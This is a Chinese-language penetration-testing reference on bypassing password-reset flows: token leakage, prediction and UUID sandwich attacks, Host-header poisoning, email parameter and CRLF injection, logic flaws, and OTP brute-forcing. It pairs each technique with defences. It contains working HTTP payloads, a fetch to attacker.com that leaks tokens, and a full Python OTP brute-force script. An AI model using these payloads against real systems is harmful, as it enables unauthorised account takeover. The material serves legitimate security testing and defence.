---
attack_surface: [认证/授权绕过, 信息泄露, 配置缺陷, 竞态/时序, 密码学误用]
impact: [身份伪造, 权限提升, 信息泄露, 完整性破坏, 可用性破坏]
risk_level: 高
prerequisites:
  - HTTP 协议基础
  - Burp Suite 基础操作
  - 理解密码重置 Token 生命周期
related_techniques:
  - account-takeover
  - 2fa-otp-bypass
  - login-bypass
  - race-condition
  - registration-vulnerabilities
  - uuid-insecurities
  - host-header-attacks
difficulty: 中级
tools:
  - Burp Suite Professional
  - Burp Sequencer
  - Burp Intruder (IP Rotator 扩展)
  - guidtool
  - sandwich (UUID Sandwich Attack)
  - UUID Detector (Burp 扩展)
---

# Reset Forgotten Password Bypass — 密码重置功能绕过全矩阵

> 关联文档：[Account Takeover](../Account%20Takeover/) · [2FA/OTP Bypass](../2FA-OTP%20Bypass/) · [Login Bypass](../Login%20Bypass/) · [Race Condition](../Race%20Condition/) · [Registration Vulnerabilities](../Registration/)

---

# 0x01 原理与分类

## 1.0 TL;DR

密码重置功能是身份认证体系中最危险的攻击面之一。攻击者可通过 Token 泄露、Host 头投毒、邮件参数注入、API 逻辑缺陷、弱 Token 生成算法、响应篡改等十余种手段绕过密码重置流程，实现未经授权的账户接管（ATO）。本章以 Token 生命周期为线索，覆盖从 Token 生成、传输、验证到销毁全链路的攻击技术。

## 1.1 根本原理

密码重置流程本质上是一种**带外认证替代机制**——当用户无法提供主认证因子（密码）时，系统通过次要信道（邮箱/手机）下发一次性凭证（Token/OTP），允许用户重新设置密码。这一流程涉及以下关键安全假设：

1. **邮箱独占假设**：只有合法用户能访问其注册邮箱（但实际上邮箱也可能被攻破或 Token 在传输过程中泄露）
2. **Token 不可预测假设**：重置 Token 足够随机，无法被暴力枚举或预测（但实现中常使用弱随机源或可推导的 UUID）
3. **服务端完整性假设**：重置 URL 由服务端安全构造，不受客户端输入影响（但 Host 头常被直接用于构造绝对 URL）
4. **状态一致性假设**：Token 使用一次后立即失效、过期后不可用、与用户身份严格绑定（但实现中常遗漏其中一环）

**核心原则**：密码重置流程中的任何一个假设被打破，即可导致完整的账户接管。

## 1.2 攻击面分类

| 维度 | 值 |
|------|-----|
| 一级分类 | 认证/授权绕过（Authentication/Authorization Bypass） |
| 二级分类 | 配置缺陷、信息泄露、竞态/时序、密码学误用 |

## 1.3 影响维度

- [x] 身份伪造（冒充任意用户）
- [x] 权限提升（水平越权至任意账户）
- [x] 信息泄露（Token 外泄、用户名枚举）
- [x] 完整性破坏（篡改账户凭证）
- [x] 可用性破坏（邮箱轰炸 DoS）

## 1.4 攻击面全景图

```
┌──────────────────────────────────────────────────────────────────┐
│                    密码重置攻击面全景                               │
├───────────────┬──────────────────┬────────────────────────────────┤
│  Token 生成    │  Token 传输       │  Token 验证                     │
├───────────────┼──────────────────┼────────────────────────────────┤
│ • 弱 PRNG      │ • Referrer 泄露   │ • 过期 Token 仍可用              │
│ • UUID v1 可推│ • Host 头投毒    │ • Token 未绑定用户身份           │
│ • 基于已知信息 │ • 邮件参数注入    │ • 响应状态码篡改                │
│ • 短 OTP       │ • 中间人 (HTTP)   │ • 无暴力破解防护               │
├───────────────┴──────────────────┼────────────────────────────────┤
│  逻辑缺陷                          │  会话管理                       │
├───────────────────────────────────┼────────────────────────────────┤
│ • skipOldPwdCheck 绕过            │ • 重置后旧 Session 仍有效       │
│ • 注册即重置 (Upsert)              │ • 多设备 Session 未同步失效     │
│ • API 参数直接修改邮箱密码         │ • 注销不销毁重置 Token          │
└───────────────────────────────────┴────────────────────────────────┘
```

## 1.5 前提条件总览

不同的绕过技术有不同的依赖条件，以下是通用前提：

- 目标应用提供密码重置功能（邮箱/短信/安全问题）
- 攻击者了解目标用户的注册邮箱或用户名
- （部分技术）需要与目标用户交互（如点击恶意链接）
- （Token 预测类）需要获取至少一个合法 Token 样本进行逆向分析

---

# 0x02 Token 生命周期与生成攻击

## 2.1 Token 泄露：Referrer 头泄露

### 原理

当密码重置链接以 URL 参数形式传递 Token（如 `?token=xxx`），且用户在重置页面点击了第三方链接或加载了第三方资源（如 `<img>` 标签），浏览器的 Referer 头会将包含 Token 的完整 URL 发送给第三方服务器。

### 前提条件

- 密码重置 Token 通过 URL 查询参数传递
- 重置页面包含第三方链接或资源引用
- 目标站点未设置 `Referrer-Policy: no-referrer` 或类似限制策略

### 检测方法

1. 触发密码重置，在邮箱中获取重置链接
2. 点击重置链接进入重置页面（**不要完成密码修改**）
3. 在 Burp Suite 拦截状态下，点击页面中的任意第三方链接
4. 检查 Burp 历史记录中发往第三方域名的请求，查看 Referer 头是否包含 Token

### Payload — 主动触发 Referrer 泄露

```html
<!-- 如果重置页面允许用户发布内容（如评论、个人简介），嵌入以下代码 -->
<img src="https://attacker.com/steal">
<script>fetch('https://attacker.com/steal')</script>
```

### 防御

- Token 通过 POST body 而非 URL 参数传递
- 设置 `Referrer-Policy: no-referrer` 或 `origin`
- 在重置页面的所有外部链接添加 `rel="noreferrer"`
- Token 使用后立即失效，绑定浏览器指纹或 IP（辅助措施，可被绕过）

## 2.2 Token 生成预测

### 原理

密码重置 Token 如果基于可预测的信息生成，攻击者可以在获取少量样本后推测出目标用户的 Token。

### 常见弱生成模式

| 生成源 | 示例 | 可预测性 |
|--------|------|---------|
| 时间戳 | `md5(time())` | 已知密码重置请求时间即可复现 |
| 用户 ID | `base64(user_id + secret)` | User ID 通常为公开或可枚举信息 |
| 用户邮箱 | `md5(email)` | 邮箱已知 |
| 姓名 | `FirstName_LastName_RandomDigit` | 姓名通常公开，随机数暴力枚举 |
| 生日 | `YYYYMMDD + random` | 生日可从社工或数据泄露中获取 |
| 弱密码学 | 使用 `rand()` 而非 `random_bytes()` | 随机种子可预测 |

### 检测工具

使用 **Burp Sequencer** 分析 Token 的随机性：

1. 在 Burp 中选中密码重置请求
2. 右键 → "Send to Sequencer"
3. 配置 Token 提取规则（选择响应中的 Token 字段）
4. 发起多次密码重置请求（至少 20 次以获得有效样本）
5. 分析 Sequencer 报告的熵值、FIPS 测试结果

### 实战技巧

- 观察 Token 长度与格式：Base64（`=` 结尾）、Hex（`[0-9a-f]+`）、UUID（`8-4-4-4-12`）
- 触发不同用户的密码重置，对比 Token 差异模式
- 在相同时间戳下多次发起重置，检测是否有固定前缀或后缀
- 如果 Token 包含 `==` 或 `%3D`，可能是 Base64 编码的 JSON 或序列化对象

### 防御

- 使用密码学安全的随机数生成器：`random_bytes()` (PHP)、`secrets.token_urlsafe()` (Python)、`crypto.randomBytes()` (Node.js)
- Token 长度 ≥ 128 位熵（至少 20 字符的 hex 或 32 字符的 Base64）
- 避免将任何用户可控或可预测数据作为 Token 生成输入

## 2.3 可猜测的 UUID (v1)

### 原理

UUID v1 基于时间戳 + 时钟序列 + MAC 地址生成，具有递增可预测性。如果密码重置 Token 使用 UUID v1，攻击者可以通过 "Sandwich Attack" 获取目标用户 Token 的取值区间。

### 版本识别

```
UUID 格式: xxxxxxxx-xxxx-Mxxx-Nxxx-xxxxxxxxxxxx
           M 位 = 版本号
           N 位 = 变体标识

UUID v1: M = 1 (时间基准)
UUID v4: M = 4 (随机生成)
```

### Sandwich Attack 流程

1. 攻击者控制两个邮箱：`attacker-A@acme.com` 和 `attacker-B@acme.com`
2. 目标用户邮箱：`victim@acme.com`
3. 步骤：
   - 对 `attacker-A` 发起密码重置，收到 Token UUID `99874128-7592-11e9-8201-bb2f15014a14`
   - 立即对 `victim` 发起密码重置
   - 立即对 `attacker-B` 发起密码重置，收到 Token UUID `998796b4-7592-11e9-8201-bb2f15014a14`
   - 受害者 Token UUID 必然介于上述两个值之间
   - 暴力枚举区间内所有可能的 UUID，访问对应的重置链接
   - 获得正确 Token → 重置受害者密码 → 账户接管

### 工具

```bash
# Sandwich Attack 自动化工具
# https://github.com/Lupin-Holmes/sandwich

# UUID 分析与生成
# https://github.com/intruder-io/guidtool

# Burp 插件：UUID Detector
# https://portswigger.net/bappstore/65f32f209a72480ea5f1a0dac4f38248
```

### 防御

- 使用 UUID v4（完全随机）而非 v1（时间基准）
- 即使使用 v4，也不应将 UUID 作为唯一的安全凭证——叠加签名或 HMAC
- 对密码重置端点实施严格的速率限制（每个 IP / 每个账户）

## 2.4 过期 Token 复用

### 原理

密码重置 Token 在过期后应被服务端拒绝，但部分实现仅在前端判断过期或在服务端遗漏了过期验证，导致过期 Token 持续有效。

### 检测方法

1. 发起密码重置，获取 Token
2. 等待 Token 过期（观察邮件或页面中的过期时间提示）
3. 使用过期 Token 尝试重置密码
4. 如果成功，说明服务端未验证过期

### 防御

- 在服务端强制检查 Token 创建时间与当前时间的差值
- Token 有效期建议 ≤ 15 分钟
- 过期 Token 应立即从数据库中物理删除（而非仅标记过期）

## 2.5 暴力破解重置 Token

### 原理

如果 Token 长度不足或生成算法不够随机，且服务端缺乏暴力破解防护，攻击者可以遍历所有可能的 Token 值。

### 前提条件

- Token 熵值不足（如 4-6 位数字 OTP 只有 10000-1000000 种可能性）
- 无速率限制或仅基于 IP 限制（可使用 IP Rotator 绕过）
- 无账户锁定机制

### 利用方法

```python
# 使用 Burp Intruder + IP Rotator 绕过 IP 限制
# 或使用 Turbo Intruder 实现高速并发爆破

# 针对 6 位数字 Token:
# 设置 Payload 类型为 Numbers: 000000-999999
# 每次请求切换代理 IP (IP Rotator 扩展)
```

### 防御

- Token 至少有 20 位 hex (80 bits entropy) 或更强
- 基于账户（而非仅 IP）的速率限制：每个账户每分钟最多 3 次尝试
- 连续 5 次错误尝试后锁定该账户的密码重置功能 30 分钟
- 添加 CAPTCHA（且服务端验证 - 见 [Captcha Bypass](../Captcha%20Bypass/)）

## 2.6 尝试使用自己的 Token 重置他人账户

### 原理

服务端未将 Token 与用户身份绑定，攻击者使用自己邮箱的合法 Token 去重置其他用户的密码。

### 检测方法

1. 使用攻击者邮箱发起密码重置，获取 Token1
2. 访问重置页面，将 Token1 与受害者邮箱一起提交
3. 如果成功，说明 Token 与用户身份未绑定

### Payload

```http
POST /reset-password HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com&token=<attacker_own_valid_token>&new_password=Hacked123!
```

### 防御

- Token 在生成时与用户 ID / 邮箱进行服务端关联绑定
- 验证 Token 时同时校验 "此 Token 是否属于该邮箱"
- Token 使用 Hash 存储（如 `sha256(token + user_id)`），无法被篡改指向其他用户

---

# 0x03 Host 头与邮件参数操纵

## 3.1 密码重置投毒 (Password Reset Poisoning)

### 原理

应用在构造密码重置链接时，如果使用 `$_SERVER['HTTP_HOST']`（PHP）或 `request.getHost()`（Java）等取自主机头的值来生成绝对 URL，攻击者可以通过篡改 Host 头使重置链接指向攻击者控制的域名。

### 攻击流程

```
1. 攻击者对受害者邮箱发起密码重置
2. 在重置请求中修改 Host 头为: attacker.com
3. 服务端生成重置链接:
   https://attacker.com/reset?token=<valid_token>
4. 受害者收到邮件，点击链接
5. 请求到达 attacker.com，攻击者记录 Token
6. 攻击者使用 Token 在真实站点重置受害者密码
```

### Payload — 基础 Host 头投毒

```http
POST /forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

email=victim@target.com
```

### Payload — X-Forwarded-Host 绕过

```http
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

email=victim@target.com
```

### Payload — 其他可尝试的 Header

```http
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com
X-HTTP-Host-Override: attacker.com
Forwarded: host=attacker.com
```

### 检测方法

1. 发起正常密码重置，检查邮件中的链接是否包含域名
2. 如果使用绝对 URL，尝试在请求中修改 Host 及各类 Forwarded Header
3. 检查邮件中的重置链接域名是否变为攻击者指定值
4. 如果成功，攻击者服务器将收到受害者访问时的 Token

### 防御

- 使用 `$_SERVER['SERVER_NAME']` 而非 `$_SERVER['HTTP_HOST']` 构造 URL
- 维护域名白名单，拒绝非标准 Host 头的请求
- 在应用配置中硬编码 Base URL，不依赖请求头
- 结合反向代理 (NGINX/Apache) 在代理层设置正确的 Host 值

## 3.2 邮件参数操纵

### 原理

密码重置请求通常通过邮件发送 Token。如果后端未严格验证邮件收件人参数，攻击者可以通过参数污染 (Parameter Pollution) 或邮件头注入向邮件中添加额外的收件人，使 Token 同时发送到攻击者邮箱。

### 3.2.1 双参数污染

#### 使用 `&` 分隔符

```http
POST /resetPassword HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

email=victim@email.com&email=attacker@email.com
```

#### 使用 `%20` (空格) 分隔符

```http
POST /resetPassword HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

email=victim@email.com%20email=attacker@email.com
```

#### 使用 `|` 管道分隔符

```http
POST /resetPassword HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

email=victim@email.com|email=attacker@email.com
```

#### 使用 `,` 逗号分隔符

```http
POST /resetPassword HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

email="victim@mail.tld",email="attacker@mail.tld"
```

#### JSON 数组格式

```http
POST /resetPassword HTTP/1.1
Host: target.com
Content-Type: application/json

{"email":["victim@mail.tld","attacker@mail.tld"]}
```

### 3.2.2 邮件头注入 (CRLF)

#### 添加 CC 收件人

```http
POST /resetPassword HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
```

#### 添加 BCC 收件人

```http
POST /resetPassword HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"
```

### 3.2.3 技术背景

语言/框架对重复参数的不同处理方式是此攻击的根源：

| 语言/框架 | 重复参数行为 |
|-----------|------------|
| PHP | 取最后一个值 |
| Java (Servlet) | 取第一个值 |
| Python (Flask) | 返回列表 `["val1", "val2"]` |
| Node.js (Express) | 返回数组 `["val1", "val2"]` |
| ASP.NET | 逗号拼接 `"val1,val2"` |
| Go (`r.Form`) | 取第一个值 |

当反向代理使用一种语言、后端应用使用另一种语言时，本攻击的成功率最高。

### 防御

- 在服务端对 email 参数进行严格的单一值验证，拒绝数组或多值输入
- 使用参数化方式构造邮件收件人（而非字符串拼接）
- 对用户输入进行严格的邮件地址格式校验：只允许单个标准邮件地址格式
- 过滤或编码 CRLF 字符（`\r` `\n` → `%0d` `%0a`）

---

# 0x04 API 与逻辑缺陷

## 4.1 API 参数直接修改邮箱/密码

### 原理

部分应用的 API 端点允许通过修改请求参数直接变更任意用户的邮箱或密码，服务端未验证当前会话是否拥有对该账户的操作权限。

### Payload — 直接修改密码

```http
POST /api/changepass HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer <attacker_token>

{"form": {"email":"victim@email.tld","password":"NewPassword123!"}}
```

### 检测方法

1. 注册或登录一个普通用户账户
2. 在 Burp 中观察正常修改密码的 API 请求结构
3. 将请求体中的 email 参数替换为其他用户的邮箱
4. 检查响应是否成功（200 OK）、是否能用新密码登录受害者账户

### 防御

- 从会话 Token 中提取用户身份，不信任请求体中的用户标识
- 对密码修改操作实施二次认证（要求输入旧密码）
- 记录并告警所有账户凭据变更操作

## 4.2 响应篡改 — 用成功响应替换失败响应

### 原理

如果服务端对密码重置的结果判断依赖客户端响应状态，而中间无完整性校验，攻击者可以通过拦截并篡改 HTTP 响应绕过失败限制（如拦截 403/401 响应，替换为 200 OK 及成功 JSON）。

### 利用流程

1. 使用 Burp Suite 拦截密码重置响应
2. 如果响应为 `{"success": false}` 或 `HTTP 403`
3. 将其篡改为 `{"success": true}` 或 `HTTP 200`
4. 部分移动应用或前端 JS 仅依赖响应内容做状态跳转

### 防御

- 关键操作（密码修改）的服务端结果判定必须在服务端执行，不依赖客户端响应
- 密码修改成功后才发送确认通知邮件（即时异常告警）
- 使用 HTTPS 防止中间人篡改响应

## 4.3 skipOldPwdCheck 绕过 (Pre-Auth)

### 原理

某些框架或遗留系统在密码修改接口中暴露了 `skipOldPwdCheck` 或类似参数，允许在无需提供旧密码或验证 Token 的情况下直接修改密码。如果该接口未认证或认证检查不完整，攻击者可无需登录就重置任意账户密码。

### 漏洞模式 (PHP)

```php
// hub/rpwd.php
RequestHandler::validateCSRFToken();
$RP = new RecoverPwd();
$RP->process($_REQUEST, $_POST);

// modules/Users/RecoverPwd.php
if ($request['action'] == 'change_password') {
    $body = $this->displayChangePwd(
        $smarty, $post['user_name'], $post['confirm_new_password']
    );
}

public function displayChangePwd($smarty, $username, $newpwd) {
    $current_user = CRMEntity::getInstance('Users');
    $current_user->id = $current_user->retrieve_user_id($username);
    // ... 缺少 Token 和旧密码校验 ...
    $current_user->change_password(
        'oldpwd', $_POST['confirm_new_password'], true, true
    );  // skipOldPwdCheck = true ↑
    emptyUserAuthtokenKey($this->user_auth_token_type, $current_user->id);
}
```

### Payload — 直接修改密码

```http
POST /hub/rpwd.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

action=change_password&user_name=admin&confirm_new_password=NewP@ssw0rd!
```

### 关键检测点

- 寻找 URL 中包含 `skip`、`bypass`、`force`、`direct` 等参数的密码修改端点
- 测试密码修改端点是否能通过 GET 请求调用（GET 相比 POST 更可能被遗漏在认证检查之外）
- 测试缺少 CSRF Token 时是否能成功修改密码（说明该接口可能也未做身份校验）

### 防御

- 始终要求有效的、有时限的、绑定账户身份的 Token 才允许修改密码
- 将 `skipOldPwdCheck` 路径限制为仅认证后的常规密码修改流程，且必须验证旧密码
- 密码修改后立即使所有活跃会话失效

## 4.4 注册即重置 — Upsert 逻辑滥用

### 原理

部分应用的注册接口使用 Upsert（Insert or Update）逻辑：如果邮箱不存在则创建新用户，如果邮箱已存在则更新用户记录。攻击者可以通过注册接口提交目标用户的邮箱和新密码，直接覆盖已有账户的密码。

### Payload — Pre-Auth ATO

```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```

### 检测方法

1. 使用已注册的邮箱尝试再次注册
2. 观察响应提示（"用户已存在" vs "注册成功"）
3. 如果返回 "注册成功"，尝试用新密码登录该邮箱对应账户
4. 如果是 JSON API，尝试发送最简字段（仅 email + password），绕过可能的前端校验

### 条件与限制

- 注册端点通常不需要认证（Pre-Auth 攻击面）
- 后端使用 `INSERT ... ON DUPLICATE KEY UPDATE`（MySQL）或 `upsert`（MongoDB）逻辑
- 未区分 "创建新用户" 和 "更新已有用户" 的处理路径

### 防御

- 注册时检查邮箱唯一性，如果已存在则拒绝并提示用户登录
- 关键用户属性（如密码）的修改必须经过旧密码验证或带外确认
- 区分 `INSERT` 和 `UPDATE` 的代码路径，严禁注册路径写入/覆盖已有用户数据

---

# 0x05 速率限制与暴力破解

## 5.1 无速率限制 — 邮箱轰炸

### 原理

密码重置接口没有速率限制，攻击者可以重复发送密码重置请求，造成对目标用户邮箱的轰炸式攻击（Email Bombing）。

### 影响

- DoS：受害者邮箱被大量重置邮件淹没
- 社会工程学：在大量合法邮件中混入钓鱼邮件
- 掩盖攻击：在轰炸间隙进行其他攻击操作

### 检测方法

```bash
# 使用 Burp Intruder 连续发送 50+ 次密码重置请求
# 检查受害者邮箱是否收到对应数量的邮件
# 检查响应中是否有 rate-limit 相关头 (X-RateLimit-Remaining)
```

### 防御

- 对每个邮箱地址实施速率限制（如每小时最多 3 次）
- 对每个 IP 地址实施速率限制
- 添加 CAPTCHA（且确保服务端验证——见 [Captcha Bypass](../Captcha%20Bypass/)）

## 5.2 OTP 速率限制绕过 — 更换 Session

### 原理

应用使用 Session 跟踪 OTP 错误尝试次数，而非基于账户。攻击者每次被锁定后，只需获取新的 Session（不携带任何认证 Cookie 发起请求，或调用登出接口），即可重置 `failed_attempts` 计数器，从而实现对 4 位数字 OTP（仅 10000 种可能）的无限次暴力破解。

### 前提条件

- OTP 为 4 位数字或更弱
- 错误次数限制基于 Session 而非账户
- 获取新 Session 不需要权限（如刷新页面即可）

### 利用代码

```python
# Authentication bypass via password reset OTP + session reset
import requests
import random
from time import sleep

headers = {
    "User-Agent": "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
    "Cookie": "PHPSESSID=mrerfjsol4t2ags5ihvvb632ea"
}
url = "http://10.10.12.231:1337/reset_password.php"
logout = "http://10.10.12.231:1337/logout.php"
root = "http://10.10.12.231:1337/"

parms = dict()
ter = 0
phpsessid = ""

print("[+] Starting attack!")
sleep(3)
print("[+] This might take around 5 minutes to finish!")

try:
    while True:
        parms["recovery_code"] = f"{random.randint(0, 9999):04}"
        parms["s"] = 164
        res = requests.post(url, data=parms, allow_redirects=True,
                           verify=False, headers=headers)

        if ter == 8:  # 每 8 次尝试后刷新 Session
            out = requests.get(logout, headers=headers)
            mainp = requests.get(root)

            cookies = out.cookies
            phpsessid = cookies.get('PHPSESSID')
            headers["cookies"] = f"PHPSESSID={phpsessid}"

            # 每次刷新 Session 后需重新发送密码重置请求
            # 以获取新的 OTP（否则 OTP 对应旧 Session 无效）
            reset = requests.post(url,
                data={"email": "tester@hammer.thm"},
                allow_redirects=True, verify=False, headers=headers)
            ter = 0
        else:
            ter += 1
            if len(res.text) == 2292:  # 成功页面的特征长度
                print(len(res.text))
                print(phpsessid)

                reset_data = {
                    "new_password": "D37djkamd!",
                    "confirm_password": "D37djkamd!"
                }
                reset2 = requests.post(url, data=reset_data,
                    allow_redirects=True, verify=False, headers=headers)

                print("[+] Password has been changed to: D37djkamd!")
                break
except Exception as e:
    print("[+] Attack stopped")
```

### 防御

- 基于账户（而非 Session）跟踪 OTP 错误尝试次数
- 连续 5 次错误 OTP 后锁定该账户的密码重置流程 15 分钟
- OTP 长度至少 6 位数字（1000000 种可能），或使用字母数字混合
- 错误尝试计数器持久化到服务端数据库

---

# 0x06 会话与状态管理

## 6.1 密码重置后 Session 未失效

### 原理

用户重置密码后，旧的登录 Session（可能在其他设备或浏览器）未立即失效，持有旧 Session 的攻击者可继续访问账户。

### 检测方法

1. 在浏览器 A 中登录账户
2. 在浏览器 B 中发起密码重置并设置新密码
3. 回到浏览器 A，刷新页面
4. 如果浏览器 A 仍保持登录状态，说明旧 Session 未失效

### 防御

- 密码重置成功后，立即使该用户的所有活跃 Session 失效
- 提供 "从所有设备登出" 功能
- 在 *所有* 需要认证的请求中检查密码最后修改时间戳

## 6.2 注销不销毁重置 Token

### 原理

用户主动注销后，已有的密码重置 Token 未被销毁，仍可继续使用。

### 检测方法

1. 发起密码重置，获取 Token（不完成重置流程）
2. 用户主动登录并注销
3. 使用步骤 1 中的 Token 尝试重置密码
4. 如果成功，说明注销未销毁 Token

### 防御

- 用户成功登录后，使该账户的所有未完成密码重置 Token 失效
- 用户主动注销时（可选择）也销毁未完成的 Token

---

# 0x07 检测与防御矩阵

## 7.1 攻击-防御映射

| 攻击技术 | 攻击类型 | 关键防御 |
|---------|---------|---------|
| Referrer Token 泄露 | 信息泄露 | `Referrer-Policy: no-referrer`；Token 不通过 URL 参数传递 |
| 密码重置投毒 | Host 头注入 | 使用 `SERVER_NAME`；域名白名单 |
| 邮件参数操纵 | 参数污染/邮件头注入 | 严格单一值验证；过滤 CRLF |
| API 参数修改 | 越权 | 从 Session 提取用户身份；不信任请求体 |
| 响应篡改 | 逻辑绕过 | 服务端结果判定；HTTPS |
| skipOldPwdCheck | 认证绕过 | 强制验证旧密码或有效 Token |
| 注册即重置 (Upsert) | 逻辑缺陷 | 注册时拒绝已存在邮箱；区分 INSERT/UPDATE |
| Token 生成预测 | 密码学误用 | `secrets.token_urlsafe()` / `random_bytes()` |
| UUID v1 Sandwich | 密码学误用 | UUID v4 + HMAC 签名 |
| 过期 Token 复用 | 逻辑缺陷 | 服务端强制过期检查；过期后物理删除 |
| 暴力破解 Token | 暴力破解 | Token 熵 ≥ 80 bits；账户级速率限制 |
| 使用自己 Token 重置他人 | 绑定缺失 | Token 生成时绑定用户 ID |
| OTP Session 绕过 | 速率限制绕过 | 基于账户的错误计数器 |
| Email Bombing | DoS | 每个邮箱每小时 ≤ 3 次；CAPTCHA |
| Session 未失效 | 会话管理 | 密码修改后全部 Session 失效 |

## 7.2 纵深防御体系

```
┌─────────────────────────────────────────────────────┐
│ Layer 1: 入口控制                                    │
│ • 速率限制 (基于账户 + 基于 IP)                       │
│ • CAPTCHA (服务端验证)                                │
│ • 用户存在性信息屏蔽 (模糊提示)                        │
├─────────────────────────────────────────────────────┤
│ Layer 2: Token 安全                                  │
│ • 密码学安全随机生成 (≥128 bits)                       │
│ • Token 绑定账户身份 (Hash 绑定)                      │
│ • 15 分钟过期 + 服务端强制验证                         │
│ • 一次性使用 + 使用后立即销毁                         │
├─────────────────────────────────────────────────────┤
│ Layer 3: URL / Header 安全                           │
│ • 使用 SERVER_NAME 硬编码 Base URL                   │
│ • Referrer-Policy: no-referrer                       │
│ • Host 头白名单验证                                   │
├─────────────────────────────────────────────────────┤
│ Layer 4: 操作验证                                    │
│ • 修改密码必须验证旧密码或有效 Token                   │
│ • 关键操作发送通知邮件 (''你的密码刚刚被修改了'')      │
│ • 操作日志记录 + 异常告警                             │
├─────────────────────────────────────────────────────┤
│ Layer 5: 会话管理                                    │
│ • 密码修改后全部 Session 失效                         │
│ • 重置成功后待处理 Token 全部销毁                     │
│ • 异地/异常登录告警                                   │
└─────────────────────────────────────────────────────┘
```

## 7.3 安全测试检查清单

- [ ] 密码重置 Token 是否通过 URL 参数传递？
- [ ] 是否设置 `Referrer-Policy` 头？
- [ ] 重置 URL 是否使用客户端可控的 Host 构造？
- [ ] 邮件参数是否存在参数污染可能性？
- [ ] 重复参数的表解析行为是否已知？（前端 vs 后端）
- [ ] Token 生成是否使用密码学安全随机源？
- [ ] Token 是否绑定用户 ID？
- [ ] Token 是否有过期时间？是否在服务端强制验证？
- [ ] Token 是否一次性使用后立即失效？
- [ ] 密码重置 API 是否可无认证访问？
- [ ] 是否有 `skipOldPwdCheck` 路径暴露？
- [ ] 注册接口是否对已存在邮箱做 Upsert？
- [ ] OTP 错误尝试是否基于 Session 而非账户？
- [ ] 密码修改后旧 Session 是否立即失效？
- [ ] 是否有暴力破解防护？（账户级，非仅 IP 级）
- [ ] 密码修改通知邮件是否发送？（服务端判定成功后才发）

---

# 0x08 攻击链建模

## 8.1 完整 ATO 攻击链（Token 泄露路径）

```
[信息收集] → [触发重置] → [Token 截获] → [账户接管]
     │              │              │              │
 发现密码重置    对受害者发起    Referrer泄露/    重置密码
 功能+目标邮箱   密码重置请求   Host投毒/         登录账户
                              邮件注入截获
                              获取Token
```

## 8.2 完整 ATO 攻击链（Token 预测路径）

```
[信息收集] → [样本获取] → [算法逆向] → [Token 预测] → [账户接管]
     │              │              │              │              │
 识别Token格式   用自己邮箱    Sequencer分析   计算/暴力枚举   使用预测Token
 (UUID/Hex/      多次获取Token  识别生成模式    目标用户Token   重置密码
  Base64)       样本                          + 时间窗口
```

## 8.3 完整 ATO 攻击链（逻辑缺陷路径）

```
[信息收集] → [接口发现] → [参数篡改] → [账户接管]
     │              │              │              │
 识别未认证的    发现skip参数   修改target      获得账户
 密码修改端点    或Upsert逻辑   为受害者        完全控制
```

## 8.4 失败回退策略

| 攻击路径 | 主方案失败时 | 回退方案 |
|---------|------------|---------|
| Host 头投毒 | 修改 Host 头无效 | 尝试 X-Forwarded-Host 等 Header |
| 邮件参数注入 | `&` 分隔无效 | 尝试 `%20`、`\|`、`,`、JSON 数组、CRLF |
| Token 预测 | UUID v1 不可预测 | 检查是否为 md5(time()) 或 md5(email) |
| OTP 暴力破解 | Session 绕过被修复 | 尝试 IP Rotator 绕过 IP 速率限制 |
| API 直接修改 | 修改密码端点未找到 | 检查注册端点的 Upsert 行为 |

---

## 参考资料

- [HackTricks — Reset Forgotten Password Bypass](https://book.hacktricks.wiki/en/pentesting-web/reset-password.html)
- [Anugrah SR — 10 Password Reset Flaws](https://anugrahsr.github.io/posts/10-Password-reset-flaws/)
- [Acunetix — Password Reset Poisoning](https://www.acunetix.com/blog/articles/password-reset-poisoning/)
- [PortSwigger — UUID Detector (Burp Extension)](https://portswigger.net/bappstore/65f32f209a72480ea5f1a0dac4f38248)
- [guidtool — UUID Analysis & Generation](https://github.com/intruder-io/guidtool)
- [Lupin-Holmes — Sandwich Attack Tool](https://github.com/Lupin-Holmes/sandwich)
- [HackerOne Report 342693 — Token Leak via Referrer](https://hackerone.com/reports/342693)
- [vtenext CRM — skipOldPwdCheck to RCE Chain](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [s41n1k — Registration Upsert ATO ($4000)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
